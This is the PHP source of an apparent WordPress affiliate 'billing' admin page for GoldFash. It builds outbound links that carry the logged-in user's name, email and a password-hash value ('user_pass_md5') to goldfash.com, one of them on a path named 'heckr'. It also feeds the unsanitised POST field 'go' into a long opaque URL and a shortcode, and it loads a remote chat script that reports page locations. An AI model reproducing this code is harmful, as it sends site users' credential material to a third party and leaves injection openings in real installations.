<?php
/**
 * GoldFash Billing Page
 */
/** WordPress Administration Bootstrap */
require_once (ABSPATH . 'wp-load.php');
require_once (ABSPATH . 'wp-admin/admin.php');
require_once (ABSPATH . 'wp-admin/admin-header.php');
?>
<?php
global $current_user;
get_currentuserinfo();
?>
<?
$ufname = $current_user->user_firstname;
$ulname = $current_user->user_lastname;
$md = $current_user->user_pass_md5;
?>
<?$uname = $current_user->display_name;$uemi = $current_user->user_email;$desti = $_POST['go'];$addfunds = "https://goldfash.com/i0/m6xa8?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$uemi&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$desti";?>
<div class="wrap about-wrap">
<h1><center><img src="https://s3-ap-southeast-2.amazonaws.com/goldfash/GOLD-FASH-150x150.png" /><br /><?php _e(" Lets make money!"); ?></center></h1>
<h2><br /><?php _e("You have reached $uname&#39;s Affiliate Account"); ?></h2>
    <div class="about-text">
        <?php _e("Here $ufname, you may easily earn real cash with GoldFash!"); ?>
        <h2 class="nav-tab-wrapper">
        <form action="" method="post">
        <input type="hidden" name="page" value="gf-dashb">
            <select name="go">
  <option value="affiliates.php">Check Your Earnings</option>
  <option value="submitticket.php">Support</option>
</select>
  <input type="submit" value="Go!" class="nav-tab">
</form>
    </h2>
    </div>
    <div class="changelog">
     <?if(isset($_POST['page'])){        
      if( $_POST['page'] == "gf-dashb" ){        
          echo do_shortcode( "[gold id=$addfunds]" );        
      }        
    }else{        
         echo "$ufname please select an option";        
         echo do_shortcode( " <a href='https://goldfash.com/i0/heckr?password=$md%26password2=$md%261=add%26domain=register%26firstname=$ufname%26lastname=$ulname%26email=$uemi' target='_blank'>Or Register Here</a>" );        
    }        
?>

        <script type="text/javascript">
var LHCChatOptions = {};
LHCChatOptions.opt = {widget_height:340,widget_width:300,popup_height:520,popup_width:500};
(function() {
var po = document.createElement('script'); po.type = 'text/javascript'; po.async = true;
var refferer = (document.referrer) ? encodeURIComponent(document.referrer.substr(document.referrer.indexOf('://')+1)) : '';
var location  = (document.location) ? encodeURIComponent(window.location.href.substring(window.location.protocol.length)) : '';
po.src = 'https://www.rfig.us/livehep/index.php/chat/getstatus/(click)/internal/(position)/bottom_right/(ma)/br/(hide_offline)/true/(check_operator_messages)/true/(top)/350/(units)/pixels?r='+refferer+'&l='+location;
var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);
})();
</script>
    </div>
</div>
<script>
(adsbygoogle = window.adsbygoogle || []).push({});
</script>